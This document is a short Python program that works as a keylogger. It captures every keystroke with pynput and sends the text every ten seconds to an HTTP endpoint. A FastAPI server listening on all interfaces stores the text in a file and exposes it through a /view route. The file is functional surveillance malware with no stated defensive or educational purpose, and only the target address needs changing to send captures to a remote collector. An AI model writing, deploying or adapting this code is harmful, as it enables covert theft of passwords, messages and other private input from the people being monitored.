import threading
import json
from pynput import keyboard
from fastapi import FastAPI
import os
import requests
from pydantic import BaseModel

app = FastAPI()

text = ""
time_interval = 10

class KeyboardData(BaseModel):
    keyboardData: str

def send_post_req():
    try:
        payload = json.dumps({"keyboardData": text})
        response = requests.post("http://127.0.0.1:8080", data=payload, headers={"Content-Type": "application/json"})
        timer = threading.Timer(time_interval, send_post_req)
        timer.start()
    except Exception as e:
        print(f"Couldn't complete request! Error: {e}")

@app.post("/")
async def log_keyboard_data(keyboard_data: KeyboardData):
    with open("keyboard_capture.txt", "w") as file:
        file.write(keyboard_data.keyboardData)
    return {"message": "Successfully set the data"}

@app.post("/view")
async def get_logged_data():
    try:
        if os.path.exists("./keyboard_capture.txt"):
            with open("./keyboard_capture.txt", "r") as file:
                kl_file = file.read()
                return {"data": kl_file.replace('\n', '<br>')}
        else:
            return {"message": "Nothing logged yet."}
    except Exception as e:
        return {"error": str(e)}

def on_press(key):
    global text
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        text += str(key).strip("'")

def start_keyboard_listener():
    with keyboard.Listener(on_press=on_press) as listener:
        send_post_req()
        listener.join()

def start_fastapi_server():
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8080, log_level="warning")

if __name__ == "__main__":
    threading.Thread(target=start_fastapi_server).start()
    threading.Thread(target=start_keyboard_listener).start()